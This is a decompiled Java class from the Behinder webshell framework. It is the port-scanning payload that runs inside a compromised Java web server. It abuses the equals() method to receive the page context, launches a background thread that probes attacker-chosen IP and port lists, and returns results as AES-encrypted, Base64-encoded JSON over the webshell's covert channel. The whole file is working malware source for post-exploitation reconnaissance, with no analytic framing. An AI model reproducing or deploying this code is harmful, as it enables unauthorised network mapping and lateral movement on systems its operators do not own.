// 
// Decompiled by Procyon v0.5.36
// 

package net.rebeyond.behinder.payload.java;

import java.util.List;
import java.util.Iterator;
import java.security.Key;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.net.SocketAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import javax.servlet.ServletOutputStream;
import java.util.Map;
import java.util.HashMap;
import javax.servlet.jsp.PageContext;
import javax.servlet.http.HttpSession;
import javax.servlet.ServletResponse;
import javax.servlet.ServletRequest;

public class Scan implements Runnable
{
    public static String ipList;
    public static String portList;
    public static String taskID;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;
    
    public Scan(final HttpSession session) {
        this.Session = session;
    }
    
    public Scan() {
    }
    
    @Override
    public boolean equals(final Object obj) {
        final PageContext page = (PageContext)obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        page.getResponse().setCharacterEncoding("UTF-8");
        final Map<String, String> result = new HashMap<String, String>();
        try {
            new Thread(new Scan(this.Session)).start();
            result.put("msg", "\u626b\u63cf\u4efb\u52a1\u63d0\u4ea4\u6210\u529f");
            result.put("status", "success");
        }
        catch (Exception e) {
            result.put("msg", e.getMessage());
            result.put("status", "fail");
            try {
                final ServletOutputStream so = this.Response.getOutputStream();
                so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                so.flush();
                so.close();
                page.getOut().clear();
            }
            catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        finally {
            try {
                final ServletOutputStream so2 = this.Response.getOutputStream();
                so2.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                so2.flush();
                so2.close();
                page.getOut().clear();
            }
            catch (Exception e2) {
                e2.printStackTrace();
            }
        }
        return true;
    }
    
    @Override
    public void run() {
        try {
            final String[] ips = Scan.ipList.split(",");
            final String[] ports = Scan.portList.split(",");
            final Map<String, String> sessionObj = new HashMap<String, String>();
            final Map<String, String> scanResult = new HashMap<String, String>();
            sessionObj.put("running", "true");
            for (final String ip : ips) {
                for (final String port : ports) {
                    try {
                        final Socket socket = new Socket();
                        socket.connect(new InetSocketAddress(ip, Integer.parseInt(port)), 1000);
                        socket.close();
                        scanResult.put(ip + ":" + port, "open");
                    }
                    catch (Exception ex) {
                        scanResult.put(ip + ":" + port, "closed");
                    }
                    sessionObj.put("result", this.buildJson(scanResult, false));
                    this.Session.setAttribute(Scan.taskID, (Object)sessionObj);
                }
            }
            sessionObj.put("running", "false");
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private byte[] Encrypt(final byte[] bs) throws Exception {
        final String key = this.Session.getAttribute("u").toString();
        final byte[] raw = key.getBytes("utf-8");
        final SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        final Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        final byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }
    
    private String buildJson(final Map<String, String> entity, final boolean encode) throws Exception {
        final StringBuilder sb = new StringBuilder();
        final String version = System.getProperty("java.version");
        sb.append("{");
        for (final String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    final Class Base64 = Class.forName("java.util.Base64");
                    final Object Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                }
                else {
                    this.getClass();
                    final Class Base64 = Class.forName("sun.misc.BASE64Encoder");
                    final Object Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }
    
    private String buildJsonArray(final List<Map<String, String>> entityList, final boolean encode) throws Exception {
        final StringBuilder sb = new StringBuilder();
        sb.append("[");
        for (final Map<String, String> entity : entityList) {
            sb.append(this.buildJson(entity, encode) + ",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("]");
        return sb.toString();
    }
}
